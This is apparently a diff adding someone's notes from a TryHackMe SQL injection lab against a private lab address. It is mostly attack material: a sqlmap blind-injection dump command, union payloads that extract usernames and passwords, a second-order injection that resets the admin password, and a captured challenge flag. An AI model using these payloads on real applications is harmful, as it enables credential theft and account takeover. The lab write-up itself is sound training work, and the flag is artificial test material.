@@ -1,0 +1,45 @@
+http://10.10.205.244:5000/challenge3/login?next=http%3A%2F%2F10.10.205.244%3A5000%2Fchallenge3%2Fhome
+
+abuse the login form with blind SQL injection to extract the admin's password.
+
+
+sqlmap -u "http://10.10.205.244:5000/challenge3/login" --data "username=admin&password=admin" --dbms=sqlite  --level=5 --risk=3 --technique=b --dump  
+
+THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}
+
+
+Vulnerable notes(parameterized query) :- now can make injection at login so make a account and go to notes form
+'union select 1,2' as a username created
+
+'  union select 1,group_concat(password) from users' username created
+
+The developers have patched the login and note function. They also enabled the update password function and would like you to test it. The goal here is to exploit the vulnerable function to gain access to the admin’s account.
+
+
+we can create a user with the name admin'-- -.
+
+After having registered the malicious user, we can update the password for our new user to trigger the vulnerability. When changing the password, the application executes two queries. First, it asks the database for the username and password for our current user:
+
+SELECT username, password FROM users WHERE id = ?
+If all checks are fine, it will try to update the password for our user. Since the username gets concatenated directly into the SQL query, the executed query will look as follows:
+
+UPDATE users SET password = ? WHERE username = 'admin' -- -'
+This means that instead of updating the password for admin' -- -, the application updated the password for the admin user. 
+
+
+http://10.10.205.244:5000/challenge6/book?title=test%27)%20order%20by%204--%20- //only 4 till get something that means only 4 are columns are there
+
+') union select 1,group_concat(username),group_concat(password), 4 from users-- -
+
+SELECT id FROM books WHERE title like ''union select 'STRING%'
+
+SELECT id FROM books WHERE title like '' union select '1'-- -%' //display id=1 data
+
+'union select '-1'' union select 1,2,3,4-- -
+
+'union select '-1''  union select 1,group_concat(username),group_concat(password), 4 from users -- -
+SELECT id FROM books WHERE title like ''union select '-1'' ' union select 1,group_concat(username),group_concat(password), 4 from users -- -%'
+
+
+
+
